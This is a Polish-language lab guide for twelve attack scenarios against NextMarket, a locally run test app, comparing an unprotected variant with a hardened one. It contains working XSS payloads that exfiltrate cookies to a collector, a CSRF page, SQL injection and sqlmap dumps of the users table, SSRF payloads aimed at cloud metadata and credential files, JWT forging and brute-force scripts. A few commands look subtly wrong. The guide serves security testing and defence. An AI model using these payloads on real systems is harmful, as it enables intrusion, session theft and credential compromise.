# Praktyczny przewodnik wykonania ataków T1–T12

Dokument zawiera kompletną instrukcję wykonania każdego ze scenariuszy testowych dla aplikacji NextMarket, wraz z payloadami, narzędziami i komendami. Założenie: aplikacja działa lokalnie na `http://localhost:3000`, baza PostgreSQL na `localhost:5432`.

---

## Środowisko testowe — instalacja narzędzi

Przed rozpoczęciem testów zainstaluj następujący zestaw narzędzi:

```bash
# === DAST ===
# OWASP ZAP 2.16.1 stable (Docker — najprościej)
docker pull ghcr.io/zaproxy/zaproxy:stable

# Burp Suite Community (manualnie z https://portswigger.net)
# Nuclei — szybkie skany template-based
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# === SAST ===
# Semgrep — reguły dla Next.js
pip install semgrep
# CodeQL — w GitHub Actions (lub CLI z https://github.com/github/codeql-cli-binaries)

# === SCA ===
# Built-in: pnpm audit
# Snyk
npm install -g snyk
snyk auth

# === Scenariusz-specific ===
# sqlmap — SQL injection
pip install sqlmap   # lub: git clone https://github.com/sqlmapproject/sqlmap
# hydra — brute force
sudo apt install hydra   # Debian/Ubuntu
# ffuf — fuzzing (do IDOR, paths)
go install github.com/ffuf/ffuf/v2@latest
# curl + jq — uniwersalne narzędzia
```

Konfiguracja proxy dla manualnych testów: ZAP nasłuchuje na `127.0.0.1:8080`, certyfikat root należy zaimportować do przeglądarki (Options → Network → Server Certificates → Save → import do Firefox/Chrome).

---

## T1 — Stored XSS

**Cel:** wstrzyknięcie skryptu JS do treści ogłoszenia, który zostanie wykonany w przeglądarce kolejnych użytkowników.

**Wektor:** pole `description` formularza tworzenia ogłoszenia (`POST /api/listings` lub Server Action `createListing`).

**Payloady:**

```html
<!-- klasyczny -->
<script>alert(document.domain)</script>

<!-- bypass dla większości naiwnych sanitizerów (img onerror) -->
<img src=x onerror="fetch('http://localhost:4444/?c='+document.cookie)">

<!-- SVG-based -->
<svg onload="fetch('http://localhost:4444/?steal='+btoa(document.cookie))">

<!-- bypass dla DOMPurify w starszych wersjach -->
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```

**Procedura:**

1. Uruchom kolektor cookie na porcie 4444:
   ```bash
   python3 -m http.server 4444
   ```
2. Zaloguj się jako `jan@nextmarket.test` / `User123!` w przeglądarce z włączonym ZAP jako proxy.
3. Utwórz nowe ogłoszenie z payloadem w polu `description`.
4. Wyloguj się i wejdź ponownie jako `anna@nextmarket.test` / `User123!`.
5. Wejdź na stronę ogłoszenia utworzonego w kroku 3.
6. Sprawdź konsolę Pythona — jeśli widać żądanie z parametrem `c=` lub `steal=`, atak się powiódł.

**Automatyzacja przez ZAP:**

```bash
docker run -t ghcr.io/zaproxy/zaproxy:stable zap-full-scan.py \
  -t http://host.docker.internal:3000 \
  -r t1-xss-report.html \
  -z "-config replacer.full_list(0).description=auth-cookie \
      -config replacer.full_list(0).enabled=true"
```

**Oczekiwane wyniki:**
- Wariant A: XSS wykonywalny (alert się pojawia, cookie wycieka)
- Wariant B: pole walidowane przez Zod, ale brak sanityzacji HTML — XSS nadal aktywny
- Wariant C: `isomorphic-dompurify.sanitize()` z whitelistą tagów eliminuje skrypt

---

## T2 — Reflected XSS

**Cel:** wstrzyknięcie skryptu przez parametr URL, który zostanie odbity w odpowiedzi.

**Wektor:** parametr `?q=` w endpoincie wyszukiwania ogłoszeń (`/listings?q=...`).

**Payloady:**

```
http://localhost:3000/listings?q=<script>alert('XSS-T2')</script>
http://localhost:3000/listings?q="><img src=x onerror=alert(1)>
http://localhost:3000/listings?q=<svg/onload=alert(1)>
```

**Procedura manualna:** wklej URL do przeglądarki, sprawdź źródło strony pod kątem niezescapowanej zawartości parametru.

**Automatyzacja przez Nuclei:**

```bash
# Nuclei ma gotową bibliotekę szablonów dla XSS
nuclei -u http://localhost:3000 -t http/vulnerabilities/generic/reflected-xss.yaml
nuclei -u http://localhost:3000 -tags xss
```

**Manualne fuzzowanie przez ffuf:**

```bash
ffuf -u "http://localhost:3000/listings?q=FUZZ" \
     -w xss-payloads.txt \
     -mr "<script>alert"   # match w odpowiedzi
```

**Oczekiwane:** React/JSX domyślnie escapuje, więc T2 powinien być **zablokowany we wszystkich wariantach** — chyba że wariant A intencjonalnie używa `dangerouslySetInnerHTML` dla wyświetlania query w nagłówku "Wyniki dla: ...".

---

## T3 — CSRF na Route Handler

**Cel:** wykonanie operacji modyfikującej (np. tworzenie ogłoszenia) bez zgody zalogowanego użytkownika, przez żądanie z innego origin'a.

**Wektor:** `POST /api/listings` bez weryfikacji nagłówka `Origin`.

**Payload (HTML osadzony na stronie atakującego, np. `http://evil.local:5000/csrf.html`):**

```html
<!DOCTYPE html>
<html>
<body>
  <h1>Wygraj iPhone 16!</h1>
  <form id="exploit" action="http://localhost:3000/api/listings" method="POST">
    <input name="title" value="SPAM: kupię tanio!" />
    <input name="description" value="kontakt: attacker@evil.com" />
    <input name="price" value="1" />
  </form>
  <script>
    document.getElementById('exploit').submit();
  </script>
</body>
</html>
```

**Procedura:**

1. Uruchom prosty serwer atakującego:
   ```bash
   mkdir /tmp/evil && cd /tmp/evil
   # zapisz csrf.html z payloadem powyżej
   python3 -m http.server 5000
   ```
2. Zaloguj się do NextMarket jako `jan@nextmarket.test` (sesja w ciasteczku).
3. W tej samej przeglądarce otwórz `http://localhost:5000/csrf.html`.
4. Sprawdź panel admin/listę ogłoszeń jana — czy pojawiło się nowe?

**Bardziej kontrolowany test — curl:**

```bash
# Najpierw pobierz cookie sesji (Auth.js session cookie)
SESSION=$(curl -s -c - -X POST http://localhost:3000/api/auth/callback/credentials \
  -d "email=jan@nextmarket.test&password=User123!" \
  | grep authjs.session-token | awk '{print $7}')

# Próba CSRF — żądanie z innego Origin
curl -X POST http://localhost:3000/api/listings \
  -H "Content-Type: application/json" \
  -H "Origin: http://evil.example.com" \
  -H "Cookie: authjs.session-token=$SESSION" \
  -d '{"title":"CSRF test","description":"...","price":1}'
```

**Oczekiwane wyniki:**
- Wariant A: brak walidacji Origin → 200/201 (atak udany)
- Wariant B: brak walidacji Origin → 200/201 (atak udany)
- Wariant C: middleware sprawdza `Origin` w allowliście → **403 Forbidden**

---

## T4 — CSRF na Server Action

**Cel:** próba ominięcia wbudowanej ochrony Server Actions w Next.js.

**Wektor:** Server Action `createListing` wywoływany z innego origin'a.

**Payload:**

```bash
# Server Actions są wywoływane jako POST do dowolnej ścieżki z nagłówkiem 'Next-Action'
# Identyfikator akcji jest kryptograficzny — atakujący musi go pozyskać

# Krok 1: pobranie strony i wyciągnięcie action ID
ACTION_ID=$(curl -s http://localhost:3000/listings/new | \
  grep -oP 'action="\$ACTION_ID_\K[a-f0-9]+' | head -1)

# Krok 2: próba wywołania z innego Origin
curl -X POST http://localhost:3000/listings/new \
  -H "Origin: http://evil.example.com" \
  -H "Next-Action: $ACTION_ID" \
  -H "Content-Type: multipart/form-data; boundary=---" \
  --data-binary @malicious-form-data.bin
```

**Oczekiwane:** **wszystkie warianty** (A, B, C) powinny odrzucić — Next.js 15 domyślnie waliduje `Origin` w Server Actions. Wynik **403 / Next.js Error: Invalid Server Actions request** potwierdza wbudowaną ochronę. Test ma głównie walor potwierdzający — pokazuje że ten konkretny wektor jest mitygowany przez framework.

---

## T5 — SQL Injection

**Cel:** wstrzyknięcie SQL przez parametr sortowania w endpoincie listy ogłoszeń.

**Wektor:** `GET /api/listings?sort=...` używający `sql.raw()` lub interpolacji w wariancie A.

**Payloady manualne (curl):**

```bash
# Test podstawowy — UNION-based
curl "http://localhost:3000/api/listings?sort=price;%20SELECT%20password_hash%20FROM%20users--"

# Time-based blind SQLi
curl -w "%{time_total}\n" "http://localhost:3000/api/listings?sort=price,(SELECT%20CASE%20WHEN%20(SELECT%20count(*)%20FROM%20users%20WHERE%20role='admin')>0%20THEN%20pg_sleep(5)%20ELSE%20pg_sleep(0)%20END)"

# Error-based — wymuszenie błędu z ujawnieniem struktury
curl "http://localhost:3000/api/listings?sort=CAST(version()%20AS%20INT)"
```

**Automatyzacja przez sqlmap:**

```bash
# Najpierw zaloguj się i zapisz cookie
curl -c cookies.txt -X POST http://localhost:3000/api/auth/callback/credentials \
  -d "email=jan@nextmarket.test&password=User123!"

# Pełny test sqlmap
sqlmap -u "http://localhost:3000/api/listings?sort=price" \
       --cookie="$(cat cookies.txt | grep session | awk '{print $6"="$7}')" \
       --dbs \
       --level=5 --risk=3 \
       --batch

# Dump tabeli users
sqlmap -u "http://localhost:3000/api/listings?sort=price" \
       --cookie="..." \
       -D nextmarket -T users --dump
```

**Oczekiwane wyniki:**
- Wariant A (raw SQL): sqlmap wykryje injection w ~30s, dump tabeli `users` z hashami
- Wariant B (Drizzle query builder): odporne — Drizzle automatycznie parametryzuje
- Wariant C: dodatkowo walidacja whitelist (`sort` może być tylko `price` lub `created_at`)

---

## T6 — SSRF

**Cel:** zmuszenie aplikacji do wywołania HTTP do dowolnego URL, w tym do zasobów wewnętrznych.

**Wektor:** pole `imageUrl` w ogłoszeniu — wariant A pobiera obrazek server-side bez walidacji.

**Payloady:**

```bash
# AWS metadata service
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Cloud metadata (GCP, Azure, DO)
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/v1/

# Lokalne usługi
http://localhost:5432/                    # PostgreSQL banner
http://127.0.0.1:6379/                    # Redis (jeśli używany)
http://localhost:3000/api/internal/admin  # własne wewnętrzne endpointy

# File protocol (jeśli fetch tego nie odrzuca)
file:///etc/passwd
file:///app/.env

# DNS rebinding (bardziej zaawansowane — wymaga własnej domeny)
http://attacker-domain.com  # rezolwuje raz na 1.2.3.4, drugi raz na 169.254.169.254
```

**Procedura:**

1. Utwórz ogłoszenie z `imageUrl = http://localhost:5432/`
2. Otwórz stronę ogłoszenia w przeglądarce — w wariancie A serwer spróbuje pobrać obrazek
3. Sprawdź logi aplikacji oraz odpowiedź HTTP — jeśli widzisz fragment bannera PostgreSQL, SSRF działa

**Test automatyczny przez curl:**

```bash
# Utworzenie ogłoszenia z payloadem SSRF
curl -X POST http://localhost:3000/api/listings \
  -H "Cookie: authjs.session-token=$SESSION" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "SSRF probe",
    "description": "test",
    "price": 1,
    "imageUrl": "http://169.254.169.254/latest/meta-data/"
  }'

# Pobranie wyrenderowanej strony — odpowiedź może zawierać dane z AWS metadata
LISTING_ID="..."
curl -s http://localhost:3000/listings/$LISTING_ID | grep -A 5 "imageContent"
```

**Symulator AWS metadata (do testów bez chmury):**

```bash
docker run -d -p 169.254.169.254:80:80 cybersecurityup/aws-metadata-mock
# (wymaga ruta dla 169.254.169.254 — w Dockerze to host network)
```

**Oczekiwane:**
- Wariant A: brak walidacji → SSRF udany
- Wariant B: walidacja URL (tylko https://, brak `localhost`/`127.0.0.1`), ale obejście przez `0.0.0.0` lub DNS rebinding nadal możliwe
- Wariant C: pełen `safeFetch` z DNS lookup i blokadą prywatnych zakresów → SSRF zablokowany

---

## T7 — IDOR

**Cel:** uzyskanie dostępu do zasobów należących do innego użytkownika przez manipulację identyfikatorem w URL.

**Wektor:** `GET /api/listings/[id]/edit`, `DELETE /api/listings/[id]` bez weryfikacji właściciela.

**Payloady:**

```bash
# Krok 1: zaloguj się jako jan@nextmarket.test
curl -c jan.txt -X POST http://localhost:3000/api/auth/callback/credentials \
  -d "email=jan@nextmarket.test&password=User123!"

# Krok 2: ustal ID ogłoszenia anny
curl http://localhost:3000/api/listings | jq '.[] | select(.authorEmail=="anna@nextmarket.test") | .id'
# wynik np. "anna-listing-uuid-here"

# Krok 3: próba edycji jako jan
curl -X PUT http://localhost:3000/api/listings/anna-listing-uuid \
  -H "Cookie: $(cat jan.txt | grep session-token | awk '{print $6"="$7}')" \
  -H "Content-Type: application/json" \
  -d '{"title":"PRZEJĘTE PRZEZ JANA","price":0.01}'

# Krok 4: próba usunięcia
curl -X DELETE http://localhost:3000/api/listings/anna-listing-uuid \
  -H "Cookie: ..."
```

**Automatyzacja masowej enumeracji (ffuf):**

```bash
# Jeśli ID są numeryczne lub krótkie UUIDy — fuzzing
ffuf -u "http://localhost:3000/api/listings/FUZZ" \
     -w listing-ids.txt \
     -H "Cookie: ..." \
     -mc 200,204 -fs 0
```

**Burp Intruder (manualnie):**

1. Przechwyć żądanie `PUT /api/listings/<id>` w Burp Proxy
2. Wyślij do Intruder → Position na `<id>`
3. Payload: lista wszystkich ID z bazy lub sekwencja UUIDów
4. Filtruj odpowiedzi po `200 OK` — każda to udany IDOR

**Oczekiwane:**
- Wariant A: brak walidacji właściciela → IDOR udany, jan może edytować/usuwać ogłoszenia anny
- Wariant B: walidacja w Server Action `if (listing.userId !== session.userId)` — IDOR zablokowany dla Server Actions, **ale Route Handlers nadal mogą być podatne** (typowa luka w real-world apps)
- Wariant C: helper `requireOwnership()` + row-level security w PostgreSQL — pełna ochrona

---

## T8 — Admin bypass

**Cel:** uzyskanie dostępu do funkcji administracyjnych jako zwykły użytkownik.

**Wektor:** trasa `/admin/*`, w wariancie A middleware sprawdza tylko czy użytkownik jest zalogowany, nie rolę.

**Payloady:**

```bash
# Bezpośredni dostęp jako zwykły user
curl http://localhost:3000/admin/users \
  -H "Cookie: authjs.session-token=$JAN_SESSION"

# Próba bypass CVE-2025-29927 (Next.js 15.2 i starsze) — w 15.5.0 już zapatchowane,
# ale warto pokazać w pracy
curl http://localhost:3000/admin/users \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"

# Próba bypass przez segment-prefetch (GHSA-267c-6grr-h53f, maj 2026)
curl http://localhost:3000/admin/users \
  -H "Next-Router-Prefetch: 1" \
  -H "RSC: 1"

# Direct API access (jeśli middleware chroni tylko UI)
curl http://localhost:3000/api/admin/users \
  -H "Cookie: authjs.session-token=$JAN_SESSION"
```

**Bardziej zaawansowane — manipulacja JWT (jeśli wariant A używa słabego sekretu):**

```bash
# Wyciągnij token z ciasteczka
JWT=$(curl -s -c - -X POST http://localhost:3000/api/auth/callback/credentials \
  -d "email=jan@nextmarket.test&password=User123!" | grep session-token | awk '{print $7}')

# Dekoduj
echo $JWT | cut -d. -f2 | base64 -d | jq .

# Próba brute-force sekretu (jeśli słaby)
docker run -it --rm portswigger/turbo-intruder \
  hashcat -m 16500 $JWT /usr/share/wordlists/rockyou.txt

# Forge token z role=admin (jeśli sekret pęknie)
python3 -c "
import jwt
payload = {'sub': 'jan-id', 'role': 'admin', 'email': 'jan@nextmarket.test'}
print(jwt.encode(payload, 'cracked-secret', algorithm='HS256'))
"
```

**Oczekiwane:**
- Wariant A: middleware sprawdza tylko obecność sesji → bypass udany
- Wariant B: middleware sprawdza rolę, ale tylko dla `/admin/*` UI — `/api/admin/*` chronione tylko w Route Handlerze → częściowy bypass
- Wariant C: wielowarstwowa autoryzacja (`requireRole('admin')` w każdym endpointcie + RLS w bazie) → pełna ochrona

---

## T9 — Cache poisoning ISR

**Cel:** zatrucie ISR cache wartością widoczną dla wszystkich kolejnych użytkowników.

**Wektor:** strona listy ogłoszeń z `revalidate = 60`, klucz cache w wariancie A nie uwzględnia nagłówków personalizacyjnych.

**Payloady:**

```bash
# Wariant A: wstrzyknięcie do cache przez nagłówek X-Forwarded-Host (jeśli aplikacja go używa do URL building)
curl -H "X-Forwarded-Host: evil.attacker.com" \
     -H "X-Forwarded-Proto: https" \
     http://localhost:3000/listings

# Następnie sprawdź czy "zwykły" użytkownik dostaje zatrutą odpowiedź
curl http://localhost:3000/listings | grep "evil.attacker.com"

# Cache poisoning przez Accept-Language (zwraca przetłumaczoną wersję dla wszystkich)
curl -H "Accept-Language: ru-RU" http://localhost:3000/listings
curl http://localhost:3000/listings  # wszyscy widzą rosyjski
```

**Automatyzacja — Param Miner (Burp extension):**

1. Zainstaluj Param Miner w Burp Suite (BApp Store)
2. Przechwyć żądanie do `/listings`
3. Right-click → Param Miner → **Guess headers** (wyszukuje sekretne nagłówki wpływające na cache)
4. Jeśli wykryje header niewchodzący w klucz cache → cache poisoning możliwy

**Test ręczny okna podatności:**

```bash
# Skrypt do mierzenia okna ataku (rewalidacja co 60s)
while true; do
  curl -s http://localhost:3000/listings | grep -c "evil"
  sleep 5
done
# w drugim oknie wstrzyknij payload — sprawdź ile sekund cache pozostaje zatruty
```

**Oczekiwane:**
- Wariant A: cache key nie uwzględnia nagłówków → poisoning możliwy
- Wariant B: cache key obejmuje `pathname` + `searchParams`, ale nie nagłówki → częściowo podatne
- Wariant C: `force-dynamic` dla stron personalizowanych + `unstable_cache` z tagami zamiast time-based revalidation → ochrona

---

## T10 — Brak security headers

**Cel:** zweryfikowanie obecności i poprawności nagłówków bezpieczeństwa.

**Wektor:** wszystkie odpowiedzi HTTP aplikacji.

**Narzędzia automatyczne:**

```bash
# 1. Mozilla Observatory (CLI)
npm install -g observatory-cli
observatory localhost:3000 --format=report
# Lub przez web: https://observatory.mozilla.org/

# 2. securityheaders.com (działa tylko na publicznym URL, ale jest CLI fork)
# Dla localhost użyj ngrok:
ngrok http 3000
# potem: curl https://securityheaders.com/?q=<twoja-ngrok-url>

# 3. ZAP baseline scan — pokrywa headers + dużo więcej
docker run -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py \
  -t http://host.docker.internal:3000 \
  -r t10-headers.html

# 4. testssl.sh — dla weryfikacji TLS/HSTS
docker run --rm -ti drwetter/testssl.sh https://localhost:3000

# 5. Curl — szybki podgląd
curl -sI http://localhost:3000 | grep -iE "(content-security|strict-transport|x-frame|referrer|permissions-policy|x-content-type)"
```

**Lista nagłówków do sprawdzenia:**

| Nagłówek | Wariant A | Wariant B | Wariant C |
|---|---|---|---|
| `Content-Security-Policy` | brak | basic | strict-dynamic + nonce |
| `Strict-Transport-Security` | brak | obecny | obecny + preload |
| `X-Frame-Options` | brak | DENY | DENY |
| `X-Content-Type-Options` | brak | nosniff | nosniff |
| `Referrer-Policy` | brak | brak | strict-origin-when-cross-origin |
| `Permissions-Policy` | brak | brak | obecny |

**Oczekiwane wyniki Mozilla Observatory:**
- Wariant A: ocena **F** (0/100)
- Wariant B: ocena **C** lub **B** (~40–70/100)
- Wariant C: ocena **A+** (90+/100)

---

## T11 — Brute force login

**Cel:** wykonanie wielu prób logowania w krótkim czasie bez napotkania rate limitu.

**Wektor:** `POST /api/auth/callback/credentials`.

**Payload — Hydra:**

```bash
# Najpierw przygotuj request file dla Hydra (Hydra dla HTTP POST forms)
cat > nextmarket-hydra.txt << 'EOF'
/api/auth/callback/credentials:email=^USER^&password=^PASS^&csrfToken=...:CredentialsSignin
EOF

# Atak na konkretnego usera
hydra -l jan@nextmarket.test \
      -P /usr/share/wordlists/rockyou.txt \
      -s 3000 \
      -t 16 \
      localhost \
      http-post-form "/api/auth/callback/credentials:email=^USER^&password=^PASS^:CredentialsSignin"
```

**Custom Python script (lepsza kontrola):**

```python
# brute.py
import requests, time
from concurrent.futures import ThreadPoolExecutor

URL = "http://localhost:3000/api/auth/callback/credentials"
passwords = open("rockyou.txt").read().splitlines()[:1000]

def attempt(pw):
    r = requests.post(URL, data={
        "email": "jan@nextmarket.test",
        "password": pw
    }, allow_redirects=False)
    if r.status_code == 302 and "error" not in r.headers.get("Location", ""):
        print(f"[+] FOUND: {pw}")
        return True

start = time.time()
with ThreadPoolExecutor(max_workers=50) as ex:
    list(ex.map(attempt, passwords))
print(f"Tested {len(passwords)} passwords in {time.time()-start:.1f}s")
```

**Metryki do zbadania:**

```bash
# Średnia odpowiedź (powinna rosnąć dla wariantu C z exponential backoff)
for i in {1..20}; do
  curl -w "%{time_total}\n" -o /dev/null -s \
    -X POST http://localhost:3000/api/auth/callback/credentials \
    -d "email=jan@nextmarket.test&password=wrong-pass-$i"
done

# Stosunek prób zaakceptowanych do zablokowanych
# (warianty A i B: 100% zaakceptowane, wariant C: <10% po 5 próbach)
```

**Oczekiwane:**
- Wariant A i B: 100% żądań przetworzonych, ~50ms/żądanie → 1000 prób w ~20 sekund
- Wariant C: po 5 próbach z tego samego IP → 429 Too Many Requests + CAPTCHA + exponential backoff

---

## T12 — Dependency vulnerabilities

**Cel:** identyfikacja podatności w zależnościach.

**Wektor:** `package.json` + `pnpm-lock.yaml`.

**Narzędzia:**

```bash
# 1. pnpm audit (built-in)
cd next-market-cybersec
pnpm audit --audit-level=moderate

# 2. npm audit (gdyby projekt używał npm)
npm audit --audit-level=high

# 3. Snyk — najlepszy free tier
snyk test
snyk monitor    # zapisanie snapshot do dashboard

# 4. OSV-Scanner (Google) — bezpłatny, oparty o publiczną bazę
go install github.com/google/osv-scanner/cmd/osv-scanner@latest
osv-scanner --lockfile=pnpm-lock.yaml

# 5. GitHub Dependabot — automatyczne w GitHub Actions
# .github/dependabot.yml:
cat > .github/dependabot.yml << 'EOF'
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
EOF

# 6. Renovate — bardziej zaawansowana automatyzacja
# https://github.com/renovatebot/renovate

# 7. Socket.dev — ochrona przed supply-chain attacks
npm install -g @socketsecurity/cli
socket npm ls
```

**Test celowo niezaktualizowanej wersji w wariancie A:**

```bash
# Wariant A ma Next.js 15.2.0 — podatne na CVE-2025-29927
cd repo && git checkout baseline
grep '"next"' package.json
# > "next": "15.2.0"

# Snyk to wykryje:
snyk test --severity-threshold=high
# Expected output: 
#   ✗ High severity vulnerability found in next
#     CVE-2025-29927: Authorization Bypass in Next.js Middleware
```

**Integracja z CI/CD (GitHub Actions):**

```yaml
# .github/workflows/security.yml
name: Security checks
on: [push, pull_request]
jobs:
  sca:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: pnpm/action-setup@v4
      - run: pnpm install --frozen-lockfile
      - name: pnpm audit
        run: pnpm audit --audit-level=high
      - name: Snyk
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high
      - name: OSV Scanner
        uses: google/osv-scanner-action/osv-scanner-action@v1
        with:
          scan-args: |-
            --lockfile=./pnpm-lock.yaml
```

**Oczekiwane:**
- Wariant A: ~15+ podatności high/critical (celowo stara Next.js + lockfile sprzed maja 2026)
- Wariant B: 0–2 podatności medium (najnowsze wersje minor)
- Wariant C: 0 podatności + CI blokuje merge przy wykryciu high → należy bumpować zależności

---

## Konsolidacja — uruchomienie pełnej baterii testów

```bash
#!/bin/bash
# run-all-tests.sh — uruchom dla każdego wariantu (baseline, master, hardened)

VARIANT=$1
git checkout $VARIANT
pnpm install --frozen-lockfile
pnpm db:push && pnpm db:seed
pnpm dev &
SERVER_PID=$!
sleep 10

mkdir -p reports/$VARIANT

# T10 — security headers (najszybszy, bez stanu)
curl -sI http://localhost:3000 > reports/$VARIANT/T10-headers.txt

# T12 — dependencies
pnpm audit --json > reports/$VARIANT/T12-pnpm-audit.json
snyk test --json > reports/$VARIANT/T12-snyk.json || true

# ZAP baseline (T1, T2, T3, T6, T9, T10 — pasywnie)
docker run --rm -v $(pwd)/reports/$VARIANT:/zap/wrk \
  ghcr.io/zaproxy/zaproxy:stable zap-baseline.py \
  -t http://host.docker.internal:3000 \
  -r zap-baseline.html

# ZAP full (T1, T2, T5, T7 — aktywnie)
docker run --rm -v $(pwd)/reports/$VARIANT:/zap/wrk \
  ghcr.io/zaproxy/zaproxy:stable zap-full-scan.py \
  -t http://host.docker.internal:3000 \
  -r zap-full.html

# T5 — sqlmap dla konkretnego endpointu
sqlmap -u "http://localhost:3000/api/listings?sort=price" \
       --batch --crawl=2 \
       --output-dir=reports/$VARIANT/sqlmap

# T11 — brute force benchmark
python3 brute.py | tee reports/$VARIANT/T11-bruteforce.log

# T3, T7, T8 — własne skrypty
bash scripts/test-csrf-route-handler.sh > reports/$VARIANT/T3.log
bash scripts/test-idor.sh > reports/$VARIANT/T7.log
bash scripts/test-admin-bypass.sh > reports/$VARIANT/T8.log

kill $SERVER_PID
```

Tabela metryk do zebrania per wariant:

| Metryka | Źródło |
|---|---|
| Liczba alertów ZAP (high/medium/low) | `zap-baseline.html`, `zap-full.html` |
| Liczba CVE w zależnościach | `snyk.json`, `pnpm-audit.json` |
| Ocena Mozilla Observatory | manualnie z UI |
| Czas wykonania 1000 prób logowania | `T11-bruteforce.log` |
| Liczba scenariuszy "udanych" / 12 | agregacja własna |
| Średni TTFB (ms) | `curl -w` w `run-all-tests.sh` |